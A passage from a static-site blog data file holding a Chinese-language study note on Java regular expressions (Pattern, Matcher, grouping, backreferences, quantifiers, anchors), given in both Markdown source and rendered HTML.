写正则表达式思路\n\n1.先写出一个简单的表达式,接着根据各种情况来逐渐完善\n\n2.如果遇到需要不匹配的内容,可以在()外对其进行匹配,并可以用标志性符号对其设置边界,比如url中的/\n\n\n\n\n\n","source":"_posts/java正则表达式.md","raw":"---\ntitle: java正则表达式\ndate: 2021-12-06 21:43:24\ntags:\n    - java\n    - 正则表达式\ncategories: java\ndescription: java正则\ntypora-root-url: ..\n---\n\n首先感谢[韩顺平老师的课程](https://www.bilibili.com/video/BV1Eq4y1E79W?p=1&spm_id_from=pageDriver)!!\n\n#### 正则匹配中贪婪模式和非贪婪模式的区别\n\n我个人理解为,贪婪模式情况下,会尽可能多的进行每一次的匹配,非贪婪模式每一次进行匹配都会找尽可能短的满足`?`前条件的字符完成本次匹配\n\n#### java正则简单实现\n\n简单实践,后面记录各个类和方法的信息\n\n```java\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\npublic class r1 {\n\n    public static void main(String[] args) {\n        String content=\"2000年5月，JDK1.3、JDK1.4和J2SE1.3相继发布，几周后其获得了Apple公司Mac OS X的工业标准的支持。2001年9月24日，J2EE1.3发布。\" +\n                \"2002年2月26日，J2SE1.4发布。自此Java的计算能力有了大幅提升，与J2SE1.3相比，其多了近62%的类和接口。在这些新特性当中，还提供了广泛的XML支持、安全套接字（Socket）支持（通过SSL与TLS协议）、全新的I/OAPI、正则表达式、日志与断言。\" +\n                \"2004年9月30日，J2SE1.5发布，成为Java语言发展史上的又一里程碑。为了表示该版本的重要性，J2SE 1.5更名为Java SE 5.0（内部版本号1.5.0），\" +\n                \"代号为“Tiger”，Tiger包含了从1996年发布1.0版本以来的最重大的更新，其中包括泛型支持、基本类型的自动装箱、改进的循环、枚举类型、\" +\n                \"格式化I/O及可变参数。\";\n\t\t//匹配数字或者单词\n        Pattern pattern = Pattern.compile(\"\\\\d\\\\d\\\\d\\\\d\");\n        //2.创建一个匹配器对象\n        Matcher matcher= pattern.matcher(content);\n        //可以循环匹配\n        while(matcher.find()){\n            //匹配文本放到matcher.group(0)\n            System.out.println(\"找到\"+matcher.group(0));\n        }\n    }\n}\n\n```\n\n##### `matcher.find()`完成的任务:\n\n1.根据指定的规则定位满足规则的子字符串(比如2000)\n\n2.找到后,将子字符串的开始索引记录到matcher对象的属性int[] groups;\n\n![image-20211207000454930](/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207000454930.png)\n\n![](/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207000542796.png)\n\ngroups[0]=0,把该子字符串的结束的索引+1的值记录到groups[1]=4\n\n3.同时记录oldLast值为子字符串的结束的索引+1,即下次执行find方法时就从记录的索引位置4开始匹配\n\ngroup()源码\n\n```java\npublic String group(int group) {\n        if (first < 0)\n            throw new IllegalStateException(\"No match found\");\n        if (group < 0 || group > groupCount())\n            throw new IndexOutOfBoundsException(\"No group \" + group);\n        if ((groups[group*2] == -1) || (groups[group*2+1] == -1))\n            return null;\n        return getSubSequence(groups[group * 2], groups[group * 2 + 1]).toString();//截取字符串\n    }\n```\n\n1.根据groups[0]和groups[1]的记录位置,从content开始截取,从content开始截取字符串返回就是[0,4),包含0但是不包含索引为4的位置\n\n如果再次执行find方法,仍然按照上面的方法,groups[0]和groups[1]记录本次的开始和结束位置,group[0]记录的是下次!![](/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207001258292.png)\n\n`Pattern pattern = Pattern.compile(\"(\\\\d\\\\d)(\\\\d\\\\d)\");`加上括号,分组匹配:\n\n根据指定的规则，定位满足规则的子字符串(比如(20)(00))\n\n1.找到后将 子字符串的开始索引 group[0]=0 记录到 matcher 对象的熟悉 int[] groups数组中；\n2.1 groups[0] = 0, 把该子字符串的结束的索引+1的值记录到 groups[1] = 4\n2.2 记录1组()匹配到的子字符串 groups[2] = 0 groups[3] = 2\n2.3 记录2组()匹配到的子字符串 groups[4] = 2 groups[5] = 4\n\n![](/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207004146025.png)\n\n2.4 如果有更多的分组，同理\n\n```java\nwhile (matcher.find()) {\n\n            System.out.println(\"找到：\" + matcher.group(0)); // 2000\n            System.out.println(\"第一组匹配到的值: \" + matcher.group(1)); // 2\n            System.out.println(\"第二组匹配到的值: \" + matcher.group(2)); // 000\n            // System.out.println(\"找到：\" + matcher.group(3)); 索引越界\n        }\n```\n\n<img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207004834793.png\" style=\"zoom:80%;\" />\n\n3.同时记录 oldLast 的值为 子字符串的结束的 索引+1的值即69，即下次执行find时，就从69开始匹配。\n\n**我的理解是,group[0]永远获取的是每次整个表达式匹配的结果,group(1)和group(2)则是每次匹配到的括号内的内容**\n\n\n\n##### 转义字符的使用\n\n注:在java的正则表达式中,两个\\\\\\\\代表一个\\\n\n```java\npublic class Demo {\n    public static void main(String[] args) {\n        String content = \"abc$(a.bc(123(\";\n\n        // 俩个 \\\\ 字符表示 \\\n        Pattern compile = Pattern.compile(\"\\\\(\");\n        // 2.创建一个匹配器对象\n        Matcher matcher = compile.matcher(content);\n        // 3. 可以循环匹配\n        while (matcher.find()) {\n            // 匹配内容，文本，放到 m.group(0)\n            System.out.println(\"找到：\" + matcher.group(0));\n        }\n    }\n}\n```\n\n#### 区分大小写\n\njava正则表达式默认是区分大小写的,如何实现不区分大小写\n\n- (?i)abc      表示abc都不区分大小写\n- a(?i)bc       表示bc不区分大小写\n- a((?i)b)c     表示只有b不区分大小写\n- `Pattern pat  = Pattern.compile(regEx,pattern.CASE_INSENSITIVE);`开启不区分大小写的匹配,整个regEx都不区分大小写\n\n\n\n#### 关于[ ]的一些注意点\n\n^在[ ]内表示非\n\n[ ]内的任意字符之间都是或的关系\n\n[ ]内的符号就只是一个符号了,不带特殊功能    **注意:在( )内要加转义符**\n\n#### 限定符\n\n| 示例        | 说明                                                        |\n| ----------- | ----------------------------------------------------------- |\n| (abc)*      | 仅包含任意个abc的字符串                                     |\n| m+(abc)*    | 以m开头,后接任意个abc的字符串                               |\n| m+abc?      | 以m开头,后接ab或者abc的字符串                               |\n| [abcd]{3}   | 由abcd中字母组成的任意长度为3的字符串                       |\n| [abcd]{3,}  | 由abcd中字母组成的任意长度不小于3的字符串                   |\n| [abcd]{3,5} | 由abcd中字母组成的任意长度不小于3,不大于5的字符串(左闭右开) |\n\njava匹配默认贪婪匹配\n\n\n\n#### 定位符\n\n定位符,规定要匹配的字符串出现的位置,比如在字符串的开始还是在结束的位置\n\n| 符号 | 含义                   | 示例             | 说明                                                       |\n| ---- | ---------------------- | ---------------- | ---------------------------------------------------------- |\n| ^    | 指定起始字符           | ^[0-9]+[a-z]*    | 以至少1个数字开头,后接任意个小写字母的字符串               |\n| $    | 指定结束字符           | ^[0-9]\\\\-[a-z]+$ | 以1个数字开头后接连字符\"-\",并以至少1个小写字母结尾的字符串 |\n| \\b   | 匹配目标字符串的边界   | er\\\\b            | 匹配forev`er`中的er,但不匹配verb中的er                     |\n| \\B   | 匹配目标字符串的非边界 | er\\\\B            | 匹配v`er`b中的er,但不匹配forever中的er                     |\n\n#### 分组\n\n##### (pattern)\n\n非命名捕获,捕获匹配的子字符串,编号为0的第一个捕获是由整个正则表达式模式匹配的文本(即group(0)),其它捕获结果则根据左括号的顺序从1开始自动编号\n\n##### (?\\<name\\>)\n\n命名捕获,将匹配的字符串捕获到一个组名称或编号名称中,用于name的字符串不能包含任何表单符号,并且不能以数字开头,可以使用单引号替代尖括号,例如(?'name')\n\n```java\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\npublic class r1 {\n    public static void main(String[] args) {\n        String content=\"dsfdsfds s7789 nn1189han\";\n//      String regStr=\"^[0-9]+[a-z]+\\\\d+$\";\n        String regStr=\"(?<g1>\\\\d\\\\d)(?<g2>\\\\d\\\\d)\";\n        Pattern pattern=Pattern.compile(regStr);\n        //创建一个匹配器对象\n        Matcher matcher= pattern.matcher(content);\n        while (matcher.find()) {\n            System.out.println(\"找到：\" + matcher.group(0)); // 2000\n            System.out.println(\"分组1(根据组名): \"+matcher.group(\"g1\"));\n            System.out.println(\"分组1: \"+matcher.group(1));\n            System.out.println(\"分组2(根据组名): \"+matcher.group(\"g2\"));\n            System.out.println(\"分组2: \"+matcher.group(2));\n        }\n    }\n}\n```\n\n![](/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207234020782.png)\n\n#### 非捕获分组\n\n##### (?:pattern)\n\n非捕获分组不算入分组内,即不能通过group(i)去访问\n\n```java\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\npublic class r1 {\n    public static void main(String[] args) {\n        String content=\"124张三男士  hell张三先生   张三同学  \";\n//      String regStr=\"^[0-9]+[a-z]+\\\\d+$\";\n        String regStr=\"张三(?:男士|先生|同学)\";//等价于:张三男士|张三先生|张三同学\n        Pattern pattern=Pattern.compile(regStr);\n        //创建一个匹配器对象\n        Matcher matcher= pattern.matcher(content);\n        while (matcher.find()) {\n            System.out.println(\"找到：\" + matcher.group(0)); // 2000\n        }\n    }\n}\n\n```\n\n![](/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211208235406173.png)\n\n##### (?=pattern)\n\n它是一个非捕获匹配,例如,\"windows(?=95|98|NT|2000)\"匹配\"windows2000\"中的\"windows\",但不匹配\"windows10\"中的windows\n\n(理解这个等号的含义即可)\n\n##### (?!pattern)\n\n与上一个刚好相反,例如,\"windows(?=95|98|NT|2000)\"匹配\"windows10\"中的\"windows\",但不匹配\"windows2000\"中的windows\n\n(理解!与=的相反含义)\n\n#### 匹配汉字\n\n`resStr = \"^[\\u0391-\\uffe5]+$\"`\n\n上面的regStr匹配纯汉字\n\n\\u0391-\\uffe5是汉字的编码范围\n\n一些练习:\n\n匹配1-9开头的六位数:  `^[1-9]\\\\d{5}$`\n\n匹配必须以13,14,15,18开头的11位数: `^1[3458]\\\\d{9}$`\n\n匹配小数或者整数 `^[-+]?([1-9]\\\\d*|0)(\\\\.\\\\d+)?$`\n\n\n\n\n\n### 三个常用类\n\n#### Pattern类\n\nPattern对象是一个正则表达式对象,Pattern类没有公共构造方法,(不需要new)要创建一个Pattern对象,调用其公共静态方法,它返回一个Pattern对象,该方法接受一个正则表达式作为它的第一个参数,比如\n\n```java\nPattern p=Pattern.compile(regStr);\n```\n\n##### matches方法\n\n如果只是判断是否满足格式,可以使用Pattern的matches,整体匹配,比较简洁,返回一个bool值,但是只能整体匹配,不能分组\n\n`Pattern.matches(regStr,content)`\n\n### Matcher类\n\nMatcher类是对输入字符进行解释和匹配的引擎,与Pattern类一样,Matcher也没有公共构造方法,需要调用Pattern对象的matcher方法来获得一个Matcher对象,比如\n\n```java\nMatcher matcher= pattern.matcher(content);\n```\n\n##### matcher.start();获取find每一组开始的索引\n\n##### matcher.end();获取find每一组尾部的索引\n\n##### replaceAll();//替换,注意该函数只是返回替换后的结果,并不修改原来conetent\n\n```\npublic class r1 {\n    public static void main(String[] args) {\n        String content=\"我确实是个傻缺\";\n//      String regStr=\"^[0-9]+[a-z]+\\\\d+$\";\n        String regStr=\"确实\";\n        Pattern pattern=Pattern.compile(regStr);\n        //创建一个匹配器对象\n        Matcher matcher= pattern.matcher(content);\n        while (matcher.find()) {\n            String newContent=matcher.replaceAll(\"雀氏\");\n            System.out.println(newContent);\n        }\n    }\n}\n```\n\n\n\n### PatternSyntaxException类\n\nPatternSyntaxException是一个非强制异常类,它表示一个正则表达式中的语法错误\n\n\n\n\n\n#### 分组,捕获,反向引用\n\n1.分组\n\n我们可以用圆括号组成一个比较复杂的匹配模式,那么一个圆括号的部分我们可以看作是一个子表达式(一个分组)\n\n2.捕获\n\n把正则表达式中子表达式/分组匹配的内容,保存澡内存中以数字编号或显式命名的组里,方便后面引用,从左往右,以分组的左括号为标志,第一个为1,0代表整个表达式匹配内容\n\n3.**反向引用**\n\n圆括号的内容被捕获偶,可以在这个括号后被引用,从而写出一个比较使用的匹配模式,这个称为反向引用,这种引用既可以是在正则表达式内部,<u>也可以是在正则表达式外部,内部反向引用用`\\\\分组号`,外部反向引用`$分组号`</u>\n\n例子,匹配回文数\n\n```java\nString regStr=\"(\\\\d)(\\\\d)\\\\2\\\\1\";\n```\n\n---应用示例:\n\n结巴程序:把 类似: \"我....我要....学学学学....编程java!\"   通过正则表达式修改为\"我要学编程java!\"\n\n思路:\n\n1.去掉所有的点\n\n2.去除所有重复字\n\n```java\npublic static void main(String[] args) {\n        String content=\"我....我要....学学学学....编程java!\";\n        //1.去掉所有的点\n        String regStr=\"\\\\.\";\n        Pattern pattern=Pattern.compile(regStr);\n        Matcher matcher= pattern.matcher(content);\n        content=matcher.replaceAll(\"\");\n        System.out.println(content);\n        //2去除所有重复字\n        regStr=\"(.)\\\\1+\";//只会匹配到1-多的字符串\n        pattern=Pattern.compile(regStr);\n        matcher=pattern.matcher((content));\n        content=matcher.replaceAll(\"$1\");//分组的表达式外引用\n        System.out.println(content);\n    \t//第2步的代码也可以用一行代码替换\n        /*content=Pattern.compile(\"(.)\\\\1+\").matcher(content).replaceAll(\"$1\");\n        System.out.println(content);\n        */\n    \n    }\n```\n\n\n\n#### String类中使用正则表达式\n\nString类中可以直接使用\n\n1. replaceAll()方法\n\n2. matches()方法\n\n3. 分割功能    split()方法中可以使用正则表达式\n\n   ```java\n   public class r1 {\n       public static void main(String[] args) {\n           String content=\"hello#abc-jack12smith~河南\";\n           //要求按照#或-或~或数字来分割\n           String[]spilt = content.split(\"#|~|-|\\\\d+\");\n           for(String s : spilt){//类似于foreach\n               System.out.println(s);\n           }\n       }\n   }\n   ```\n\n   ![](/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211209124141204.png)\n\n#### 写正则表达式思路\n\n1.先写出一个简单的表达式,接着根据各种情况来逐渐完善\n\n2.如果遇到需要不匹配的内容,可以在()外对其进行匹配,并可以用标志性符号对其设置边界,比如url中的/\n\n\n\n\n\n","slug":"java正则表达式","published":1,"updated":"2022-01-07T13:31:06.118Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckyiip9ml001bgsw9hguleepo","content":"<p>首先感谢<a href=\"https://www.bilibili.com/video/BV1Eq4y1E79W?p=1&spm_id_from=pageDriver\">韩顺平老师的课程</a>!!</p>\n<h4 id=\"正则匹配中贪婪模式和非贪婪模式的区别\"><a href=\"#正则匹配中贪婪模式和非贪婪模式的区别\" class=\"headerlink\" title=\"正则匹配中贪婪模式和非贪婪模式的区别\"></a>正则匹配中贪婪模式和非贪婪模式的区别</h4><p>我个人理解为,贪婪模式情况下,会尽可能多的进行每一次的匹配,非贪婪模式每一次进行匹配都会找尽可能短的满足<code>?</code>前条件的字符完成本次匹配</p>\n<h4 id=\"java正则简单实现\"><a href=\"#java正则简单实现\" class=\"headerlink\" title=\"java正则简单实现\"></a>java正则简单实现</h4><p>简单实践,后面记录各个类和方法的信息</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.Matcher;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.regex.Pattern;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">r1</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String content=<span class=\"string\">&quot;2000年5月，JDK1.3、JDK1.4和J2SE1.3相继发布，几周后其获得了Apple公司Mac OS X的工业标准的支持。2001年9月24日，J2EE1.3发布。&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;2002年2月26日，J2SE1.4发布。自此Java的计算能力有了大幅提升，与J2SE1.3相比，其多了近62%的类和接口。在这些新特性当中，还提供了广泛的XML支持、安全套接字（Socket）支持（通过SSL与TLS协议）、全新的I/OAPI、正则表达式、日志与断言。&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;2004年9月30日，J2SE1.5发布，成为Java语言发展史上的又一里程碑。为了表示该版本的重要性，J2SE 1.5更名为Java SE 5.0（内部版本号1.5.0），&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;代号为“Tiger”，Tiger包含了从1996年发布1.0版本以来的最重大的更新，其中包括泛型支持、基本类型的自动装箱、改进的循环、枚举类型、&quot;</span> +</span><br><span class=\"line\">                <span class=\"string\">&quot;格式化I/O及可变参数。&quot;</span>;</span><br><span class=\"line\">\t\t<span class=\"comment\">//匹配数字或者单词</span></span><br><span class=\"line\">        Pattern pattern = Pattern.compile(<span class=\"string\">&quot;\\\\d\\\\d\\\\d\\\\d&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//2.创建一个匹配器对象</span></span><br><span class=\"line\">        Matcher matcher= pattern.matcher(content);</span><br><span class=\"line\">        <span class=\"comment\">//可以循环匹配</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(matcher.find())&#123;</span><br><span class=\"line\">            <span class=\"comment\">//匹配文本放到matcher.group(0)</span></span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;找到&quot;</span>+matcher.group(<span class=\"number\">0</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"matcher-find-完成的任务\"><a href=\"#matcher-find-完成的任务\" class=\"headerlink\" title=\"matcher.find()完成的任务:\"></a><code>matcher.find()</code>完成的任务:</h5><p>1.根据指定的规则定位满足规则的子字符串(比如2000)</p>\n<p>2.找到后,将子字符串的开始索引记录到matcher对象的属性int[] groups;</p>\n<p><img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207000454930.png\" alt=\"image-20211207000454930\"></p>\n<p><img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207000542796.png\"></p>\n<p>groups[0]=0,把该子字符串的结束的索引+1的值记录到groups[1]=4</p>\n<p>3.同时记录oldLast值为子字符串的结束的索引+1,即下次执行find方法时就从记录的索引位置4开始匹配</p>\n<p>group()源码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">group</span><span class=\"params\">(<span class=\"keyword\">int</span> group)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (first &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IllegalStateException(<span class=\"string\">&quot;No match found&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (group &lt; <span class=\"number\">0</span> || group &gt; groupCount())</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IndexOutOfBoundsException(<span class=\"string\">&quot;No group &quot;</span> + group);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((groups[group*<span class=\"number\">2</span>] == -<span class=\"number\">1</span>) || (groups[group*<span class=\"number\">2</span>+<span class=\"number\">1</span>] == -<span class=\"number\">1</span>))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> getSubSequence(groups[group * <span class=\"number\">2</span>], groups[group * <span class=\"number\">2</span> + <span class=\"number\">1</span>]).toString();<span class=\"comment\">//截取字符串</span></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>1.根据groups[0]和groups[1]的记录位置,从content开始截取,从content开始截取字符串返回就是[0,4),包含0但是不包含索引为4的位置</p>\n<p>如果再次执行find方法,仍然按照上面的方法,groups[0]和groups[1]记录本次的开始和结束位置,group[0]记录的是下次!<img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207001258292.png\"></p>\n<p><code>Pattern pattern = Pattern.compile(&quot;(\\\\d\\\\d)(\\\\d\\\\d)&quot;);</code>加上括号,分组匹配:</p>\n<p>根据指定的规则，定位满足规则的子字符串(比如(20)(00))</p>\n<p>1.找到后将 子字符串的开始索引 group[0]=0 记录到 matcher 对象的熟悉 int[] groups数组中；<br>2.1 groups[0] = 0, 把该子字符串的结束的索引+1的值记录到 groups[1] = 4<br>2.2 记录1组()匹配到的子字符串 groups[2] = 0 groups[3] = 2<br>2.3 记录2组()匹配到的子字符串 groups[4] = 2 groups[5] = 4</p>\n<p><img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207004146025.png\"></p>\n<p>2.4 如果有更多的分组，同理</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> (matcher.find()) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;找到：&quot;</span> + matcher.group(<span class=\"number\">0</span>)); <span class=\"comment\">// 2000</span></span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;第一组匹配到的值: &quot;</span> + matcher.group(<span class=\"number\">1</span>)); <span class=\"comment\">// 2</span></span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;第二组匹配到的值: &quot;</span> + matcher.group(<span class=\"number\">2</span>)); <span class=\"comment\">// 000</span></span><br><span class=\"line\">            <span class=\"comment\">// System.out.println(&quot;找到：&quot; + matcher.group(3)); 索引越界</span></span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207004834793.png\" style=\"zoom:80%;\" />\n\n<p>3.同时记录 oldLast 的值为 子字符串的结束的 索引+1的值即69，即下次执行find时，就从69开始匹配。</p>\n<p><strong>我的理解是,group[0]永远获取的是每次整个表达式匹配的结果,group(1)和group(2)则是每次匹配到的括号内的内容</strong></p>\n<h5 id=\"转义字符的使用\"><a href=\"#转义字符的使用\" class=\"headerlink\" title=\"转义字符的使用\"></a>转义字符的使用</h5><p>注:在java的正则表达式中,两个\\\\代表一个\\</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Demo</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        String content = <span class=\"string\">&quot;abc$(a.bc(123(&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 俩个 \\\\ 字符表示 \\</span></span><br><span class=\"line\">        Pattern compile = Pattern.compile(<span class=\"string\">&quot;\\\\(&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 2.创建一个匹配器对象</span></span><br><span class=\"line\">        Matcher matcher = compile.matcher(content);</span><br><span class=\"line\">        <span class=\"comment\">// 3. 可以循环匹配</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> (matcher.find()) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// 匹配内容，文本，放到 m.group(0)</span></span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;找到：&quot;</span> + matcher.group(<span class=\"number\">0</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"区分大小写\"><a href=\"#区分大小写\" class=\"headerlink\" title=\"区分大小写\"></a>区分大小写</h4><p>java正则表达式默认是区分大小写的,如何实现不区分大小写</p>\n<ul>\n<li>(?i)abc      表示abc都不区分大小写</li>\n<li>a(?i)bc       表示bc不区分大小写</li>\n<li>a((?i)b)c     表示只有b不区分大小写</li>\n<li><code>Pattern pat  = Pattern.compile(regEx,pattern.CASE_INSENSITIVE);</code>开启不区分大小写的匹配,整个regEx都不区分大小写</li>\n</ul>\n<h4 id=\"关于-的一些注意点\"><a href=\"#关于-的一些注意点\" class=\"headerlink\" title=\"关于[ ]的一些注意点\"></a>关于[ ]的一些注意点</h4><p>^在[ ]内表示非</p>\n<p>[ ]内的任意字符之间都是或的关系</p>\n<p>[ ]内的符号就只是一个符号了,不带特殊功能    <strong>注意:在( )内要加转义符</strong></p>\n<h4 id=\"限定符\"><a href=\"#限定符\" class=\"headerlink\" title=\"限定符\"></a>限定符</h4><table>\n<thead>\n<tr>\n<th>示例</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>(abc)*</td>\n<td>仅包含任意个abc的字符串</td>\n</tr>\n<tr>\n<td>m+(abc)*</td>\n<td>以m开头,后接任意个abc的字符串</td>\n</tr>\n<tr>\n<td>m+abc?</td>\n<td>以m开头,后接ab或者abc的字符串</td>\n</tr>\n<tr>\n<td>[abcd]{3}</td>\n<td>由abcd中字母组成的任意长度为3的字符串</td>\n</tr>\n<tr>\n<td>[abcd]{3,}</td>\n<td>由abcd中字母组成的任意长度不小于3的字符串</td>\n</tr>\n<tr>\n<td>[abcd]{3,5}</td>\n<td>由abcd中字母组成的任意长度不小于3,不大于5的字符串(左闭右开)</td>\n</tr>\n</tbody></table>\n<p>java匹配默认贪婪匹配</p>\n<h4 id=\"定位符\"><a href=\"#定位符\" class=\"headerlink\" title=\"定位符\"></a>定位符</h4><p>定位符,规定要匹配的字符串出现的位置,比如在字符串的开始还是在结束的位置</p>\n<table>\n<thead>\n<tr>\n<th>符号</th>\n<th>含义</th>\n<th>示例</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>^</td>\n<td>指定起始字符</td>\n<td>^[0-9]+[a-z]*</td>\n<td>以至少1个数字开头,后接任意个小写字母的字符串</td>\n</tr>\n<tr>\n<td>$</td>\n<td>指定结束字符</td>\n<td>^[0-9]\\-[a-z]+$</td>\n<td>以1个数字开头后接连字符”-“,并以至少1个小写字母结尾的字符串</td>\n</tr>\n<tr>\n<td>\\b</td>\n<td>匹配目标字符串的边界</td>\n<td>er\\b</td>\n<td>匹配forev<code>er</code>中的er,但不匹配verb中的er</td>\n</tr>\n<tr>\n<td>\\B</td>\n<td>匹配目标字符串的非边界</td>\n<td>er\\B</td>\n<td>匹配v<code>er</code>b中的er,但不匹配forever中的er</td>\n</tr>\n</tbody></table>\n<h4 id=\"分组\"><a href=\"#分组\" class=\"headerlink\" title=\"分组\"></a>分组</h4><h5 id=\"pattern\"><a href=\"#pattern\" class=\"headerlink\" title=\"(pattern)\"></a>(pattern)</h5><p>非命名捕获,捕获匹配的子字符串,编号为0的第一个捕获是由整个正则表达式模式匹配的文本(即group(0)),其它捕获结果则根据左括号的顺序从1开始自动编号</p>\n<h5 id=\"lt-name-gt\"><a href=\"#lt-name-gt\" class=\"headerlink\" title=\"(?&lt;name&gt;)\"></a>(?&lt;name&gt;)</h5><p>命名捕获,将匹配的字符串捕获到一个组名称或编号名称中,用于name的字符串不能包含任何表单符号,并且不能以数字开头,可以使用单引号替代尖括号,例如(?’name’)</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span 